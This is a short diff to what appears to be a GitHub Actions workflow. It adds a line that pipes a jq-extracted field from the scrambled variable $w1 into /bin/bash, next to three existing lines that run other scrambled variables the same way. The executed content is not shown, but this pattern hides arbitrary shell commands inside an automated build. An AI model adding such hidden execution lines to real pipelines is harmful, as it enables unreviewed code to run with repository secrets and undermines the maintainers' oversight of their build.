@@ -25,6 +25,7 @@ jobs:
           echo $laxhs6 | jq -r .ufjbp823 | /bin/bash
           printf '%s' "$dq22" | jq -r .kgcgw84914 | /bin/bash
           echo $murk737 | jq -r .ggfs84 | /bin/bash
+          printf '%s' "$w1" | jq -r .d0123 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
